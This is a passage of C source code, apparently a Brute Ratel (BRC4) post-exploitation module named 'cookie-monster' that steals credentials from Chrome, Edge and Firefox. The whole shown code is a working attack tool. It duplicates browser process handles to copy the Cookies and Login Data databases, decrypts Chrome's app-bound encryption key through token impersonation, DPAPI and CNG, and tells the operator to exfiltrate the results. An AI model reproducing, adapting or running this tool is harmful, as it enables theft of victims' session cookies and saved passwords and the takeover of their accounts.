            MSVCRT$sprintf(copyFilePath, "%s\\%s", folderPath, downloadFileName);
            HANDLE hFile = KERNEL32$CreateFileA(copyFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

            if (hFile == INVALID_HANDLE_VALUE) {
                BadgerDispatch(g_dispatch, "[-] Failed to write password file to %s\n", copyFilePath);
            } else {
                DWORD written = 0;
                KERNEL32$WriteFile(hFile, buffer, dwFileSize, &written, NULL);
                BadgerDispatch(g_dispatch, "[+] Wrote password file to: %s\n", copyFilePath);
                KERNEL32$CloseHandle(hFile);
            } 
            
            KERNEL32$GlobalFree(buffer);
            KERNEL32$GlobalFree(shi);
            BadgerFree((PVOID *)&objectTypeInfo);
            BadgerFree((PVOID *)&objectNameInfo);
            return TRUE;
        }
    
    } // end handle iteration (for loop)

    return FALSE;
}

VOID GetBrowserData(Mode browser, int cookie, int loginData, char * folderPath) {
    //get handle to all processes
    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    INT processCount = 0;
    BOOL databaseStatus = FALSE;
    BOOL passwordStatus = FALSE;
    // if cookie only
    if (cookie == 1 && loginData == 0) {
        //then dont check for password data
        passwordStatus = TRUE;
    }
    // if login data only
    if (loginData == 1 && cookie == 0) {
        //then dont check for cookie data
        databaseStatus = TRUE;
    }
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    char * browserProcess = "";
    char * cookieDB = "";
    char * passwordDB = "";
    char * cookiePath = "";
    char * passwordPath = "";
    
    if (browser == EDGE){
        browserProcess = "msedge.exe";
        cookieDB = "EdgeCookies.db";
        passwordDB = "EdgePasswords.db";
        cookiePath = "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies";
        passwordPath = "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
    }
    else if (browser == CHROME){
        browserProcess = "chrome.exe";
        cookieDB = "ChromeCookies.db";
        passwordDB = "ChromePasswords.db";
        cookiePath = "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
        passwordPath = "\\Google\\Chrome\\User Data\\Default\\Login Data";
    } else {
        BadgerDispatch(g_dispatch, "[-] GetBrowserData was called with invalid browser set\n");
        return;
    }
    
    
    //iterate through each handle to find browser process
    BadgerDispatch(g_dispatch, "[*] Searching for browser process\n");
    if(KERNEL32$Process32First(hSnap, &pe32)) {
        do {
            // BadgerDispatch(g_dispatch, "[~] Process: %s\n", pe32.szExeFile);
            if(MSVCRT$strcmp(pe32.szExeFile, browserProcess) == 0) 
            {
                // browser was found, get cookies database
                processCount++;
                if (databaseStatus == FALSE){
                    if (GetBrowserFile(pe32.th32ProcessID, "Network\\Cookies", cookieDB, folderPath)){
                        databaseStatus = TRUE;
                    }
                }
                if (passwordStatus == FALSE){
                    if (GetBrowserFile(pe32.th32ProcessID, "Login Data", passwordDB, folderPath)){
                        passwordStatus = TRUE;
                    }
                }
            }
        } while(KERNEL32$Process32Next(hSnap, &pe32));
        if (!databaseStatus){
            BadgerDispatch(g_dispatch, "[-] No handle to cookies was found\n");
        }
        if (!passwordStatus){
            BadgerDispatch(g_dispatch, "[-] No handle to login data was found\n");
        }
    }

    KERNEL32$CloseHandle(hSnap);

    //check if process was running
    if (processCount == 0) {
        BadgerDispatch(g_dispatch, "[*] The browser was not found running on host\n");

        //check if file exists
        CHAR *data = GetFileContent(cookiePath);
        if(data == NULL) {
            BadgerDispatch(g_dispatch, "[-] Could not access cookie file. It may not exist or we lack permissions\n");
            return;
        }

        // if copy folder is not null, then copy to folder instead of download_file()
        if (folderPath){

            CHAR cookieFilePath[MAX_PATH];
            MSVCRT$sprintf(cookieFilePath, "%s\\%s", folderPath, cookieDB);
            HANDLE hFile = KERNEL32$CreateFileA(cookieFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            
            if (hFile == INVALID_HANDLE_VALUE) {
                BadgerDispatch(g_dispatch, "[-] Failed to write cookie file to %s\n", cookieFilePath);
            } else {
                DWORD written = 0;
                KERNEL32$WriteFile(hFile, data, KERNEL32$GetFileSize(hFile, NULL), &written, NULL);
                BadgerDispatch(g_dispatch, "[+] Wrote cookie file to: %s\n", cookieFilePath);
                KERNEL32$CloseHandle(hFile);
            }
            
        } else {
            download_file(); // kept in if BRC4 ever supports file exfiltration
        }

        KERNEL32$GlobalFree(data);
        CHAR *passwordData = GetFileContent(passwordPath);
        if(passwordData == NULL) {
            BadgerDispatch(g_dispatch, "[-] Could not access login data file. It may not exist or we lack permissions\n", browser);
            return;
        }

        // if copy folder is not null, then copy to folder instead of download_file()
        if (folderPath){
            CHAR passwordFilePath[MAX_PATH];
            MSVCRT$sprintf(passwordFilePath, "%s\\%s", folderPath, passwordDB);
            HANDLE hFile = KERNEL32$CreateFileA(passwordFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

            if (hFile == INVALID_HANDLE_VALUE) {
                BadgerDispatch(g_dispatch, "[-] Failed to write password file to %s\n", passwordFilePath);
            } else {
                DWORD written = 0;
                KERNEL32$WriteFile(hFile, passwordData, KERNEL32$GetFileSize(hFile, NULL), &written, NULL);
                BadgerDispatch(g_dispatch, "[+] Wrote password file to: %s\n", passwordFilePath);
                KERNEL32$CloseHandle(hFile);
            }
        } else {
            download_file(); // kept in if BRC4 ever supports file exfiltration
        }
        
        KERNEL32$GlobalFree(passwordData);
    }
}

// Helper functions for string operations - Chrome style
BOOL PopFromStringFront(BYTE** data, DWORD* data_len, DWORD pop_len, BYTE* output) {
    // Check if we have enough data
    if (*data_len < pop_len) {
        return FALSE;
    }

    // Copy the data if output buffer is provided
    if (output != NULL) {
        BadgerMemcpy(output, *data, pop_len);
    }

    // Move the pointer forward
    *data += pop_len;
    *data_len -= pop_len;
    
    return TRUE;
}

BOOL PopDWORDFromStringFront(BYTE** data, DWORD* data_len, DWORD* output) {
    if (*data_len < sizeof(DWORD)) {
        return FALSE;
    }

    if (output != NULL) {
        *output = *((DWORD*)*data);
    }

    *data += sizeof(DWORD);
    *data_len -= (DWORD)sizeof(DWORD);
    
    return TRUE;
}

BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_size) {
    NCRYPT_PROV_HANDLE hProvider = 0;
    NCRYPT_KEY_HANDLE hKey = 0;
    BYTE* output_buffer = NULL;
    DWORD buffer_size = 0;
    SECURITY_STATUS status;
    
    // Initialize output size
    *output_size = 0;
    
    // Open storage provider
    LPCWSTR provider_name = L"Microsoft Software Key Storage Provider";
    status = NCRYPT$NCryptOpenStorageProvider(&hProvider, provider_name, 0);
    if (status != ERROR_SUCCESS) {
        BadgerDispatch(g_dispatch, "[-] NCryptOpenStorageProvider failed with status 0x%08X\n", status);
        return NULL;
    }
    
    // Open key
    LPCWSTR key_name = L"Google Chromekey1";
    status = NCRYPT$NCryptOpenKey(hProvider, &hKey, key_name, 0, 0);
    if (status != ERROR_SUCCESS) {
        BadgerDispatch(g_dispatch, "[-] NCryptOpenKey failed with status 0x%08X\n", status);
        NCRYPT$NCryptFreeObject(hProvider);
        return NULL;
    }
    
    // First call to get required buffer size
    status = NCRYPT$NCryptDecrypt(
        hKey,
        (PBYTE)input_data,
        input_size,
        NULL,                    // pPaddingInfo
        NULL,                    // pbOutput (NULL to get size)
        0,                       // cbOutput
        &buffer_size,            // pcbResult
        NCRYPT_SILENT_FLAG       // dwFlags (0x40)
    );
    
    if (status != ERROR_SUCCESS) {
        BadgerDispatch(g_dispatch, "[-] 1st NCryptDecrypt failed with status 0x%08X\n", status);
        NCRYPT$NCryptFreeObject(hKey);
        NCRYPT$NCryptFreeObject(hProvider);
        return NULL;
    }
    
    // Allocate output buffer
    output_buffer = (BYTE*)BadgerAlloc(buffer_size);
    if (!output_buffer) {
        BadgerDispatch(g_dispatch, "[-] Memory allocation failed\n");
        NCRYPT$NCryptFreeObject(hKey);
        NCRYPT$NCryptFreeObject(hProvider);
        return NULL;
    }
    
    // Second call to actually decrypt
    status = NCRYPT$NCryptDecrypt(
        hKey,
        (PBYTE)input_data,
        input_size,
        NULL,                    // pPaddingInfo
        output_buffer,           // pbOutput
        buffer_size,             // cbOutput
        &buffer_size,            // pcbResult (actual bytes written)
        NCRYPT_SILENT_FLAG       // dwFlags (0x40)
    );
    
    if (status != ERROR_SUCCESS) {
        BadgerDispatch(g_dispatch, "[-] 2nd NCryptDecrypt failed with status 0x%08X\n", status);
        BadgerFree((PVOID *)&output_buffer);
        output_buffer = NULL;
        buffer_size = 0;
    }
    
    // Clean up
    NCRYPT$NCryptFreeObject(hKey);
    NCRYPT$NCryptFreeObject(hProvider);
    
    // Set output size
    *output_size = buffer_size;
    
    return output_buffer;
}

BOOL AppBoundDecryptor(char * localStateFile, int pid){
    

    char * app_data = GetFileContent(localStateFile);
    CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
    if(app_data == NULL) {
        BadgerDispatch(g_dispatch, "[-] Reading the file failed in AppBoundDecryptor\n");
        return FALSE;
    }
    char * app_key = ExtractKey(app_data, app_pattern);

    // Base64 decode the app_bound_encrypted_key
    size_t encrypted_key_len;
    uint8_t* encrypted_key_with_header = Base64Decode(app_key, &encrypted_key_len);
    if (encrypted_key_with_header == NULL) {
        BadgerDispatch(g_dispatch, "[-] Failed to base64 decode the key\n");
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }
    
    // Validate key prefix (APPB)
    if (encrypted_key_len < sizeof(kCryptAppBoundKeyPrefix) || MSVCRT$memcmp(encrypted_key_with_header, kCryptAppBoundKeyPrefix, sizeof(kCryptAppBoundKeyPrefix)) != 0) {
        BadgerDispatch(g_dispatch, "[-] Invalid key header - expected 'APPB' prefix\n");
        BadgerFree((PVOID*)&encrypted_key_with_header);
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }
    
    // Strip prefix
    uint8_t* encrypted_key = (uint8_t*)BadgerAlloc(encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
    if (encrypted_key == NULL) {
        BadgerDispatch(g_dispatch, "[-] Failed to allocate memory for encrypted key\n");
        BadgerFree((PVOID*)&encrypted_key_with_header);
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }
    
    BadgerMemcpy(encrypted_key, encrypted_key_with_header + sizeof(kCryptAppBoundKeyPrefix), encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
    encrypted_key_len -= sizeof(kCryptAppBoundKeyPrefix);
    BadgerFree((PVOID*)&encrypted_key_with_header);

    // First, attempt to decrypt as SYSTEM
    BadgerDispatch(g_dispatch, "[*] Attempting to decrypt key as SYSTEM...\n");
    
    DATA_BLOB encrypted_blob;
    DATA_BLOB intermediate_blob;
    DATA_BLOB decrypted_blob;
    
    encrypted_blob.pbData = encrypted_key;
    encrypted_blob.cbData = (DWORD) encrypted_key_len;
    HANDLE hUser = NULL;
    HANDLE hToken = NULL;
    HANDLE hProcess = NULL;
    
    BOOL result = CRYPT32$CryptUnprotectData(&encrypted_blob, NULL, NULL, NULL, NULL, 0, &intermediate_blob);
    if (result) {
        BadgerDispatch(g_dispatch, "[*] Attempting to impersonate user to decrypt...\n");
        
        // Impersonate the user
        hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD) pid);
        if (hProcess == NULL) {
            BadgerDispatch(g_dispatch, "[-] Failed to open process: %lu\n", KERNEL32$GetLastError());
            BadgerFree((PVOID*)&encrypted_key);
            KERNEL32$GlobalFree(app_data);
            KERNEL32$GlobalFree(app_key);
            return FALSE;
        }
        
        if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
            BadgerDispatch(g_dispatch, "[-] Failed to open process token: %lu\n", KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hProcess);
            BadgerFree((PVOID*)&encrypted_key);
            KERNEL32$GlobalFree(app_data);
            KERNEL32$GlobalFree(app_key);
            return FALSE;
        }
        
        if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenPrimary, &hUser)) {
            BadgerDispatch(g_dispatch, "[-] Failed to duplicate token: %lu\n", KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hToken);
            KERNEL32$CloseHandle(hProcess);
            BadgerFree((PVOID*)&encrypted_key);
            KERNEL32$GlobalFree(app_data);
            KERNEL32$GlobalFree(app_key);
            return FALSE;
        }
        
        if (!ADVAPI32$ImpersonateLoggedOnUser(hUser)) {
            BadgerDispatch(g_dispatch, "[-] Failed to impersonate user: %lu\n", KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hToken);
            KERNEL32$CloseHandle(hProcess);
            KERNEL32$CloseHandle(hUser);
            BadgerFree((PVOID*)&encrypted_key);
            KERNEL32$GlobalFree(app_data);
            KERNEL32$GlobalFree(app_key);
            return FALSE;
        }
        
        BadgerDispatch(g_dispatch, "[+] Successfully impersonated user with PID: %d\n", pid);
        
        // Now try to decrypt as impersonated user
        result = CRYPT32$CryptUnprotectData(&intermediate_blob, NULL, NULL, NULL, NULL, 0, &decrypted_blob);
        if (!result) {
            BadgerDispatch(g_dispatch, "[-] Decrypting as impersonated user failed: %lu\n", KERNEL32$GetLastError());
            ADVAPI32$RevertToSelf();
            KERNEL32$CloseHandle(hToken);
            KERNEL32$CloseHandle(hProcess);
            KERNEL32$CloseHandle(hUser);
            BadgerFree((PVOID*)&encrypted_key);
            KERNEL32$GlobalFree(app_data);
            KERNEL32$GlobalFree(app_key);
            return FALSE;
        }
        
        BadgerDispatch(g_dispatch, "[+] Successfully decrypted key as impersonated user!\n");
    } else {
        BadgerDispatch(g_dispatch, "[-] Failed to decrypt key as SYSTEM!\n");
        BadgerFree((PVOID*)&encrypted_key);
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }

    // Revert impersonation
    if (hUser != NULL) {
        ADVAPI32$RevertToSelf();
        KERNEL32$CloseHandle(hToken);
        KERNEL32$CloseHandle(hProcess);
        KERNEL32$CloseHandle(hUser);
        BadgerDispatch(g_dispatch, "[*] Called Rev2Self\n");
    }
    
    // Parse the decrypted data - Chrome format
    BYTE* cursor = decrypted_blob.pbData;
    DWORD remaining = decrypted_blob.cbData;
    DWORD validation_len = 0;

    // Get validation string length
    if (!PopDWORDFromStringFront(&cursor, &remaining, &validation_len)) {
        BadgerDispatch(g_dispatch, "[-] Failed to read validation length.\n");
        KERNEL32$LocalFree(decrypted_blob.pbData);
        BadgerFree((PVOID*)&encrypted_key);
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }
    
    if (validation_len > remaining) {
        BadgerDispatch(g_dispatch, "[-] Validation length (%lu) exceeds remaining data (%lu).\n", validation_len, remaining);
        KERNEL32$LocalFree(decrypted_blob.pbData);
        BadgerFree((PVOID*)&encrypted_key);
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }
    
    // Get validation string
    if (!PopFromStringFront(&cursor, &remaining, validation_len, NULL)) {
        BadgerDispatch(g_dispatch, "[-] Failed to extract validation blob.\n");
        KERNEL32$LocalFree(decrypted_blob.pbData);
        BadgerFree((PVOID*)&encrypted_key);
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }
    
    // Get key length
    DWORD key_len = 0;
    if (!PopDWORDFromStringFront(&cursor, &remaining, &key_len)) {
        BadgerDispatch(g_dispatch, "[-] Failed to read key length.\n");
        KERNEL32$LocalFree(decrypted_blob.pbData);
        BadgerFree((PVOID*)&encrypted_key);
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }
    
    if (key_len > remaining) {
        BadgerDispatch(g_dispatch, "[-] Key length (%lu) exceeds remaining data (%lu).\n", key_len, remaining);
        KERNEL32$LocalFree(decrypted_blob.pbData);
        BadgerFree((PVOID*)&encrypted_key);
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }
    
    // Get key blob
    BYTE* key_blob = cursor;
    
        // if first byte is 03 then decyrpt with CNG
        if (key_blob[0] == 0x03) {
            BadgerDispatch(g_dispatch, "[*] Decrypting key with CNG...");
            BYTE* aes_encrypted_key = key_blob + 1;  // skip flag
            DWORD cng_out_len = 0;
            BYTE *decrypted = decrypt_with_cng(aes_encrypted_key, 32, &cng_out_len);
            if (decrypted) {
                CHAR *chromeOutput = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (key_len * 4) + 1);
                BadgerDispatch(g_dispatch, "[+] CNG Decryption Output (%lu bytes):\n", cng_out_len);
                
                for (DWORD i = 0; i < cng_out_len; i++) {
                    MSVCRT$sprintf(chromeOutput, "%s\\x%02x", chromeOutput, decrypted[i]);
                }
                
                BadgerDispatch(g_dispatch, "[+] Chrome AES Key: %s \n", chromeOutput );
    
                BadgerFree((PVOID *)&decrypted);
                KERNEL32$GlobalFree(chromeOutput);
    
            } else {
                BadgerDispatch(g_dispatch, "[-] CNG decryption failed.\n");
            }
    
        }
        BadgerDispatch(g_dispatch, "[+] Decrypted Key (%lu bytes):\n", key_len);
        CHAR *output = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (key_len * 4) + 1);
       
        for (DWORD i = 0; i < key_len; i++) {
            MSVCRT$sprintf(output, "%s\\x%02x", output, key_blob[i]);
        }
         
        BadgerDispatch(g_dispatch, "[+] Decrypt Key: %s \n", output );
    
    
    // Clean up
    KERNEL32$LocalFree(decrypted_blob.pbData);
    KERNEL32$LocalFree(intermediate_blob.pbData);
    BadgerFree((PVOID*)&encrypted_key);
    KERNEL32$GlobalFree(app_data);
    KERNEL32$GlobalFree(app_key);
    KERNEL32$GlobalFree(output);
    
    return TRUE;
}


BOOL str_to_uint(const char *str, unsigned int *out) {
    if (!str || !*str || !out) return FALSE;

    unsigned long val = 0;
    while (*str) {
        unsigned char c = (unsigned char)*str++;
        if (c < '0' || c > '9') return FALSE;
        unsigned int digit = c - '0';

        if (val > (UINT_MAX - digit) / 10) return FALSE; // overflow
        val = val * 10 + digit;
    }

    *out = (unsigned int)val;
    return TRUE;
}

/*














 


 








*/


void printHelp(){
	BadgerDispatch(g_dispatch, "[*] Usage: cookie_monster.o [ chrome || edge || system <Local State File Path> <PID> || firefox || chrome-cookies <PID> || chrome-login-data <PID> || edge-cookies <PID> || edge-login-data <PID> ] [<Output Dir>] [--cookie-only] [--key-only] [--login-data-only]\n\n");
	BadgerDispatch(g_dispatch, "[*] Available modes:\n");
    BadgerDispatch(g_dispatch, "    chrome               looks at all running processes and handles, if one matches chrome.exe it copies the handle to cookies and then copies the file to the CWD\n");
    BadgerDispatch(g_dispatch, "    edge                 looks at all running processes and handles, if one matches msedge.exe it copies the handle to cookies and then copies the file to the CWD\n");
    BadgerDispatch(g_dispatch, "    system               Decrypt chromium based browser app bound encryption key without injecting into browser. Requires path to Local State file and PID of a user process for impersonation\n");
    BadgerDispatch(g_dispatch, "    firefox              looks for profiles.ini and locates the key4.db and logins.json file\n");
    BadgerDispatch(g_dispatch, "    chrome-cookies       using the provided chrome PID to look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file\n");
    BadgerDispatch(g_dispatch, "    chrome-login-data    using the provided chrome PID to look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file\n");
    BadgerDispatch(g_dispatch, "    edge-cookies         using the provided edge PID to look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file\n");
    BadgerDispatch(g_dispatch, "    edge-login-data      using the provided edge PID to look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file\n\n");
    
    BadgerDispatch(g_dispatch, "[*] Available Options:\n");
    BadgerDispatch(g_dispatch, "    --key-only           only retrieve the app bound encryption key. Do not attempt to download the Cookie or Login Data files.\n");
    BadgerDispatch(g_dispatch, "    --cookie-only        only retrieve the Cookie file. Do not attempt to download Login Data file or retrieve app bound encryption key.\n");
    BadgerDispatch(g_dispatch, "    --login-data-only    only retrieve the Login Data file. Do not attempt to download Cookie file or retrieve app bound encryption key.\n\n");
    
    BadgerDispatch(g_dispatch, "[*] Examples (example output dir is 'C:\\temp\\'):\n");
    BadgerDispatch(g_dispatch, "    cookie-monster chrome \"C:\\temp\\\"\n");
    BadgerDispatch(g_dispatch, "    cookie-monster edge \"C:\\temp\\\"\n");
    BadgerDispatch(g_dispatch, "    cookie-monster system \"C:\\Users\\<USER>\\AppData\\Local\\<BROWSER>\\User Data\\Local State\" <PID> \"C:\\temp\\\"\n");
    BadgerDispatch(g_dispatch, "    cookie-monster firefox \"C:\\temp\\\"");
    BadgerDispatch(g_dispatch, "    cookie-monster chrome-cookies <PID> \"C:\\temp\\\"\n");
    BadgerDispatch(g_dispatch, "    cookie-monster chrome-login-data <PID> \"C:\\temp\\\"\n");
    BadgerDispatch(g_dispatch, "    cookie-monster edge-cookies <PID> \"C:\\temp\\\"\n");
    BadgerDispatch(g_dispatch, "    cookie-monster edge-login-data <PID> \"C:\\temp\\\"\n");
    BadgerDispatch(g_dispatch, "    cookie-monster edge-login-data <PID> \"C:\\temp\\\"\n --login-data-only");
}


void coffee(char** argv, int argc, WCHAR** dispatch) {   
    unsigned int pid = 0; //
    BOOL keyOnly = 0;
    BOOL cookieOnly = FALSE;
    BOOL loginDataOnly = FALSE;

    char * copyFile = NULL;
    char * localStateFile = NULL;

    Mode selectedMode;

    g_dispatch = dispatch;

    // Help check
	for (int i = 0; i < argc; i++) {
		if(BadgerStrcmp(argv[i], "-h") == 0){
			printHelp();
			return;
		}
	}

    if (argc < 2){
        printHelp();
        return;
    }

    // ~~~~~~~~~~ Arg parsing start ~~~~~~~~~~

    copyFile = argv[1];

    // process flags
    for (int i=2; i<argc; i++){
        if(BadgerStrcmp(argv[i], "--cookie-only") == 0 ){
            cookieOnly = TRUE;
        }
        else if(BadgerStrcmp(argv[i], "--key-only") == 0 ){
            keyOnly = TRUE;
        }
        else if(BadgerStrcmp(argv[i], "--login-data-only") == 0 ){
            loginDataOnly = TRUE;
        }
    }

    if (BadgerStrcmp(argv[0], "chrome") == 0){
        selectedMode = CHROME;
        BadgerDispatch(g_dispatch, "[*] Chrome mode selected\n");
    }
    else if (BadgerStrcmp(argv[0], "edge") == 0){
        selectedMode = EDGE;
        BadgerDispatch(g_dispatch, "[*] Edge mode selected\n");
    }
    else if(BadgerStrcmp(argv[0], "system") == 0){
        selectedMode = SYSTEM;
        
        if(argc < 4){
            BadgerDispatch(g_dispatch, "[-] The mode 'system' requires you to pass the local state file path and PID\n");
            printHelp();
            return;
        }
        
        localStateFile = argv[1];
        if (!str_to_uint(argv[2], &pid)){
            BadgerDispatch(g_dispatch, "[-] Could not convert '%s' to PID\n", argv[2]);
            return;
        }

        copyFile = argv[3];

        BadgerDispatch(g_dispatch, "[*] System mode selected\n");
    }
    else if (BadgerStrcmp(argv[0], "firefox") == 0){
        selectedMode = FIREFOX;
        BadgerDispatch(g_dispatch, "[*] Firefox mode selected\n");
    }
    else if (BadgerStrcmp(argv[0], "chrome-cookies") == 0){
        selectedMode = CHROME_COOKIES_PID;
        if(argc < 3){
            BadgerDispatch(g_dispatch, "[-] The mode 'chrome-cookies' requires you to pass the process PID\n");
            printHelp();
            return;
        }

        if (!str_to_uint(argv[1], &pid)){
            BadgerDispatch(g_dispatch, "[-] Could not convert '%s' to PID\n", argv[2]);
            return;
        }
    
        if(!copyFile){
            BadgerDispatch(g_dispatch, "[-] The mode 'chrome-cookies' requires you to define --copy-file\n");
            return;
        }

        copyFile = argv[2];
        BadgerDispatch(g_dispatch, "[*] Chrome Cookie mode selected\n");
    }
    else if (BadgerStrcmp(argv[0], "chrome-login-data") == 0){
        selectedMode = CHROME_LOGIN_DATA_PID;
        if(argc < 3){
            BadgerDispatch(g_dispatch, "[-] The mode 'chrome-login-data' requires you to pass the process PID and output dir\n");
            printHelp();
            return;
        }
        
        if (!str_to_uint(argv[1], &pid)){
            BadgerDispatch(g_dispatch, "[-] Could not convert '%s' to PID\n", argv[2]);
            return;
        }

        copyFile = argv[2];
        BadgerDispatch(g_dispatch, "[*] Chrome Login-Data mode selected\n");
    }
    else if (BadgerStrcmp(argv[0], "edge-cookies") == 0){
        selectedMode = EDGE_COOKIES_PID;
        if(argc < 3){
            BadgerDispatch(g_dispatch, "[-] The mode 'edge-cookies' requires you to pass the process PID and output dir\n");
            printHelp();
            return;
        }
        
        if (!str_to_uint(argv[1], &pid)){
            BadgerDispatch(g_dispatch, "[-] Could not convert '%s' to PID\n", argv[2]);
            return;
        }

        copyFile = argv[2];
        BadgerDispatch(g_dispatch, "[*] Edge Cookie mode selected\n");
    }
    else if (BadgerStrcmp(argv[0], "edge-login-data") == 0){
        selectedMode = EDGE_LOGIN_DATA_PID;
        if(argc < 2){
            BadgerDispatch(g_dispatch, "[-] The mode 'edge-login-data' requires you to pass the process PID and output dir\n");
            printHelp();
            return;
        }
        
        
        if (!str_to_uint(argv[1], &pid)){
            BadgerDispatch(g_dispatch, "[-] Could not convert '%s' to PID\n", argv[2]);
            return;
        }

        copyFile = argv[2];
        BadgerDispatch(g_dispatch, "[*] Edge Login-Data mode selected\n");
    } else {
        BadgerDispatch(g_dispatch, "[-] Unrecognized mode '%s' supplied\n", argv[0]);
        printHelp();
        return;
    }

    // ~~~~~~~~~~ Arg parsing end... ~~~~~~~~~~

    if (selectedMode == CHROME || selectedMode == EDGE){
        if (keyOnly){
            BadgerDispatch(g_dispatch, "[*] Key Only enabled\n");
            GetEncryptionKey(selectedMode);
            return;
        }

        if (cookieOnly || loginDataOnly){
            BadgerDispatch(g_dispatch, "[*] Cookies Only enabled\n");
            GetBrowserData(selectedMode, cookieOnly, loginDataOnly, copyFile);
            return;
        }

        GetEncryptionKey(selectedMode);
        GetBrowserData(selectedMode, cookieOnly, loginDataOnly, copyFile);
    }
    else if (selectedMode == SYSTEM){
        
        if (keyOnly){
            AppBoundDecryptor(localStateFile, (int) pid);
            return;
        }
        
        if (cookieOnly || loginDataOnly){
            if (SHLWAPI$StrStrIA(localStateFile, "chrome") != NULL) {
                BadgerDispatch(g_dispatch, "[*] Getting Chrome cookies and passwords\n");
                GetBrowserData(selectedMode, cookieOnly, loginDataOnly, copyFile);
            }
            if (SHLWAPI$StrStrIA(localStateFile, "edge") != NULL) {
                BadgerDispatch(g_dispatch, "[*] Getting Edge cookies and passwords\n");
                GetBrowserData(selectedMode, cookieOnly, loginDataOnly, copyFile);
            }
            return;
        }
        
        if(AppBoundDecryptor(localStateFile, (int)pid)){
            if (SHLWAPI$StrStrIA(localStateFile, "chrome") != NULL) {
                BadgerDispatch(g_dispatch, "[*] Getting Chrome Cookies and Passwords");
                GetBrowserData(selectedMode, cookieOnly, loginDataOnly, copyFile);
            }
            if (SHLWAPI$StrStrIA(localStateFile, "edge") != NULL) {
                BadgerDispatch(g_dispatch, "[*] Getting Edge Cookies and Passwords");
                GetBrowserData(selectedMode, cookieOnly, loginDataOnly, copyFile);
            }
        }
    }
    else if (selectedMode == FIREFOX){
        GetFirefoxInfo();
    }
    else if (selectedMode == CHROME_COOKIES_PID){
        
        if (keyOnly){
            GetEncryptionKey(selectedMode);
            return;
        }
        
        if (cookieOnly){
            GetBrowserFile(pid, "Cookies", "ChromeCookies.db", copyFile);
            return;
        }

        GetEncryptionKey(selectedMode);
        GetBrowserFile(pid, "Cookies", "ChromeCookie.db", copyFile);
        
    }
    else if (selectedMode == CHROME_LOGIN_DATA_PID){
        if (keyOnly){
            GetEncryptionKey(selectedMode);
            return;
        }

        if (loginDataOnly){
            GetBrowserFile(pid, "Login Data", "ChromePasswords.db", copyFile);
            return;
        }

        GetEncryptionKey(selectedMode);
        GetBrowserFile(pid, "Login Data", "ChromePasswords.db", copyFile);       
    }
    else if (selectedMode == EDGE_COOKIES_PID) {
        
        if (keyOnly == 1){
            GetEncryptionKey(selectedMode);
            return;
        }
        
        if (cookieOnly == 1){
            GetBrowserFile(pid, "Cookies", "EdgeCookies.db", copyFile);
            return;
        }

        GetEncryptionKey(selectedMode);
        GetBrowserFile(pid, "Cookies", "EdgeCookie.db", copyFile);
    }

    else if (selectedMode == EDGE_LOGIN_DATA_PID){
        
        if (keyOnly == 1){
            GetEncryptionKey(selectedMode);
            return;
        }
        
        if (loginDataOnly == 1){
            GetBrowserFile(pid, "Login Data", "EdgePasswords.db", copyFile);
            return;
        }

        GetEncryptionKey(selectedMode);
        GetBrowserFile(pid, "Login Data", "EdgePasswords.db", copyFile);
        return;
    }
    else {
        BadgerDispatch(g_dispatch, "[-] Somehow we ended up with an invalid mode.\n");
    }

    BadgerDispatch(g_dispatch, "[*] Since BRC4 does not have COFF file exfiltration use the 'download' command to exfiltrate the files.\n");
}